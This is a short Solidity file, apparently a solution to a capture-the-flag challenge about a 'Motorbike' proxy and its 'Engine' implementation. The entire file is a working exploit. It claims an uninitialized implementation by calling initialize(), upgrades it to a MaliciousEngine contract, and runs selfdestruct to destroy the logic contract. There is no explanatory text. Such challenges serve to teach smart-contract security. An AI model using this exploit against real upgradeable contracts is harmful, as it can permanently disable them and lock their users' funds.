// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interfaces for the contracts
interface IMotorbike {
    // Proxy contract interface
}

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;

    function upgrader() external view returns (address);

    function horsePower() external view returns (uint256);
}

contract Hack {
    IMotorbike public target;

    constructor(address _target) {
        target = IMotorbike(_target);
    }

    function hack(address implementation) public {
        IEngine engine = IEngine(implementation);

        engine.initialize();
        MaliciousEngine maliciousEngine = new MaliciousEngine();
        engine.upgradeToAndCall(
            address(maliciousEngine),
            abi.encodeWithSelector(maliciousEngine.destroy.selector)
        );
    }
}

contract MaliciousEngine {
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}
